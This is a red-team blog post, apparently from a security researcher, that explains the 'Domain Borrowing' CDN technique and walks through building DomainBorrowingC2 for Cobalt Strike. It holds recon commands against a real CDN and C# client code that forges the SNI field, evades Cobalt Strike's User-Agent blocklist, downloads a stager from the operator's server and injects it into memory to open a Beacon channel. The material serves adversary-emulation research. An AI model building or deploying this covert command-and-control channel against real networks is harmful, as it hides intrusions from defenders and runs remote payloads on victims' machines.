---
title: Malware packers
author: Cerbersec
layout: post
---

In this post I will go over the basics of Domain Borrowing and how [DomainBorrowingC2](https://github.com/Cerbersec/DomainBorrowingC2) was built.

## Do you mind if I borrow your domain?

A new technique dubbed "Domain Borrowing" was recently presented at [Blackhat Asia 2021](https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-Ding-Domain-Borrowing-Catch-My-C2-Traffic-If-You-Can.pdf) by [Junyu Zhou](https://twitter.com/md5_salt) and Tianze Ding. They released a public [PoC](https://github.com/Dliv3/DomainBorrowing) for [Covenant](https://github.com/cobbr/Covenant).

SSL stripping and comparing the `Host` header and the **Server Name Indication (SNI)** field is one of the contributing factors that killed Domain Fronting. SNI is an extension to the TLS protocol by which a client indicates which hostname it is attempting to connect to at the start of the handshaking process. A possible workaround is to use Encrypted SNI (ESNI), however requests that have both a SNI and ESNI are frequently blocked by enterprise environments, Cloudflare, and even country-wide firewalls.

Domain Borrowing is in a sense much like Domain Fronting, except it makes sure the `Host` header and **SNI** field are the same. When a CDN is registered, a certificate and private key are uploaded to the CDN after which a CNAME DNS record is created that points the cdn.domain.name to the CDN provider's servers.

A client performing a HTTPS request can use another CDN domain hosted at the same CDN provider for DNS resolution.

![CDN DNS Resolution](/assets/images/db-cdn-dns-resolution.png)
`Image credits: https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-Ding-Domain-Borrowing-Catch-My-C2-Traffic-If-You-Can.pdf`

Combined with a CDN provider that lets us register arbitrary domains without validation we end up in a scenario where we use a legitimate domain for DNS resolution and perform a HTTPS request with our malicious target in the `Host` and **SNI** fields.

![Malicious request](/assets/images/db-malicious-request.png)
`Image credits: https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-Ding-Domain-Borrowing-Catch-My-C2-Traffic-If-You-Can.pdf`

This is great to bypass Domain Fronting detection when SSL stripping is performed and the `Host` and **SNI** fields are compared, but it still uses incorrect HTTPS certificates. When a CDN can't find the certificate, it will most likely send the default certificate to the client. Some CDNs send a `TCP RST` to the client.

There are multiple ways to obtain a valid HTTPS certificate outlined in the [slides](https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-Ding-Domain-Borrowing-Catch-My-C2-Traffic-If-You-Can.pdf). One of these methods leverages improper distribution of wildcard certificates.

![Borrow wildcard certificate](/assets/images/db-borrow-wildcard-certificate.png)
`Image credits: https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-Ding-Domain-Borrowing-Catch-My-C2-Traffic-If-You-Can.pdf`

## On the hunt

There are a couple ways of finding wildcard certificates. Using [crt.sh](https://crt.sh) you can get a quick overview of all the registered certificates associated with a domain.

![crt.sh](/assets/images/db-crt-sh.png)

Then you can start digging deeper with commands like `dig`, `whois` and `curl --resolve`.

`dig bootstrapcdn.com`
![dig bootstrapcdn.com](/assets/images/db-dig-bootstrapcdn.png)

`curl https://img.bootstrapcdn.com/test.php --resolve img.bootstrapcdn.com:443:151.139.128.11 -v`
![curl resolve](/assets/images/db-curl-resolve-bootstrapcdn.png)

A majority of websites are hidden behind reverse proxies like Cloudflare so you'll need to dig deeper to figure out their actual server IP.

## How to C2, a DIY approach

The original [PoC](https://github.com/Dliv3/DomainBorrowing) written in C# implements Domain Borrowing for the Covenant framework. I set out on a journey to port this over to Cobalt Strike.

At first I tried to use Cobalt Strike's [Malleable C2 profile](https://www.cobaltstrike.com/help-malleable-c2). Malleable C2 allows you to completely customize and control what your Beacon's HTTP traffic looks like. A single profile can be specified for use at startup of the Teamserver.

```
./teamserver [external IP] [password] [/path/to/my.profile]
```

Malleable C2 controls things like HTTP methods, encryption and compression routines, cookies, headers, jitter, user agents and more. Unfortunately as of right now it doesn't let you control the **SNI** field.

Back to the drawing board I went.

Shortly after, I ended up watching [Rasta Mouse](https://twitter.com/_RastaMouse) stream some Covenant development on [Twitch](https://www.twitch.tv/rastam0us3). He was working on a [Bridge](https://github.com/cobbr/Covenant/wiki/C2Bridges) to implement communication between Covenants Teamserver and Implant (Grunt) over DNS. That reminded me of Cobalt Strike's [External C2 spec](https://www.cobaltstrike.com/help-externalc2) which I briefly touched when I looked at [F-Secure's C3](https://github.com/FSecureLABS/C3). I also remembered [Ryan Hanson](https://twitter.com/ryhanson) wrote a [C# implementation](https://github.com/ryhanson/ExternalC2) of the External C2 spec, which was used by the [DNS over HTTPS PoC](https://github.com/SpiderLabs/DoHC2) by SpiderLabs.

I ended up combining Ryan's External C2 library with the Covenant PoC and rewrote parts of it to be compatible with .NET Core 3.1 and change the way the server handles requests from the CDN. The result is [DomainBorrowingC2](https://github.com/Cerbersec/DomainBorrowingC2).

### ServerC2

ServerC2 is a basic ASP.NET Core application which acts as a listener for ClientC2 via endpoints. ServerC2 is responsible for relaying traffic coming from ClientC2 via the CDN to Cobalt Strike's Teamserver via the ExternalC2 Socket. I modified the controllers to separate traffic meant for fetching the stager to use the `/stager` endpoint and traffic that originates from Beacon and is meant for the Teamserver to use `/beacon`. I also had to change the HTTP method PUT to POST because the CDN provider did not handle that correctly.

### ClientC2

ClientC2 is a .NET Core 3.1 Console application. This is mostly a thinned out version of Ryan's ExternalC2, but with a custom HttpsClient provided by the Covenant PoC and a custom implementation of the WebChannel, now called DomainBorrowingChannel (original I know).

The HttpsClient's `initSsl()` method holds the secret to domain borrowing, namely setting the **SNI** manually.

```csharp
private SslStream initSsl()
{
    X509Certificate2 ourCA = new X509Certificate2();
    RemoteCertificateValidationCallback callback = (sender, cert, chain, errors) =>
    {
        bool valid = true;
        if (valid && ValidateCert)
        {
            valid = errors == SslPolicyErrors.None;
        }
        return valid;
    };
    try
    {
        TcpClient client = new TcpClient(ip, port);
        SslStream sslStream = new SslStream(client.GetStream(), false, callback, null);
        // we pass SNI as first parameter to AuthenticateAsClient()
        sslStream.AuthenticateAsClient(sni, null, SslProtocols.Tls | (SslProtocols)768 | (SslProtocols)3072 | (SslProtocols)12288, true);
        return sslStream;
    }
    catch (Exception e)
    {
        Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace);
        return null;
    }
}
```

The main goal of ClientC2 is fetching and executing the stager from ServerC2. It does this in 2 steps. First it sets up a connection and asks for options to configure itself by sending an `OPTIONS` request. ServerC2 will respond with an identifier header `X-Id-Header` and a Beacon identifier header `X-Identifier`.

```csharp
public bool Connect()
{
    string[] parseHeaders = _client.Options("/beacon", "").Split("\n");
    string idHeader = string.Empty;
    string beaconId = string.Empty;

    foreach(string header in parseHeaders)
    {
        if(header.Contains("X-Id-Header"))
        {
            idHeader = header.Split(" ")[1];
        }
        else if(header.Contains("X-Identifier"))
        {
            beaconId = header.Split(" ")[1];
        }
    }

    if(beaconId != null)
    {
        this.BeaconId = new Guid(beaconId);
        headers.Add(idHeader, this.BeaconId.ToString());
        this.Connected = true;
    }
    else
    {
        this.Connected = false;
    }

    return this.Connected;
}
```

Next it will fetch the stager from the `/stager` endpoint. We configure a custom User Agent to make sure we get past Cobalt Strike's default blocklist and specify the system architecture which is used by Cobalt Strike to determine the type of payload.

```csharp
public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
{
    var bits = is64Bit ? "x64" : "x86";
    headers.Add("User-Agent", $"Mozilla/5.0 (Windows NT 10.0; {bits}; Trident/7.0; rv:11.0) like Gecko");

    var response = _client.Post("/stager", string.Empty, headers);

    return Convert.FromBase64String(response);
}
```

The client will then inject the stager into the current process and execute it in memory and attempt to connect to Beacon.

```csharp
public override Func<bool> Initialize => () =>
{
    Console.WriteLine("[-] Connecting to Web Endpoint");
    if (!Server.Connect()) return false;

    Console.WriteLine("[-] Grabbing stager bytes");
    PipeName = Server.BeaconId;
    var stager = Server.GetStager(PipeName.ToString(), Is64Bit);

    Console.WriteLine("[-] Creating new stager thread");
    if (InjectStager(stager) == 0) return false;
    Console.WriteLine("[+] Stager thread created!");

    Console.WriteLine($"[-] Connecting to pipe {PipeName}");
    Beacon.SetPipeName(PipeName);
    if (!Beacon.Connect()) return false;
    Console.WriteLine("[+] Connected to pipe. C2 initialization complete!");

    return true;
};
```

Successful callback!

![Callback](/assets/images/db-domain-borrowing-callback.png)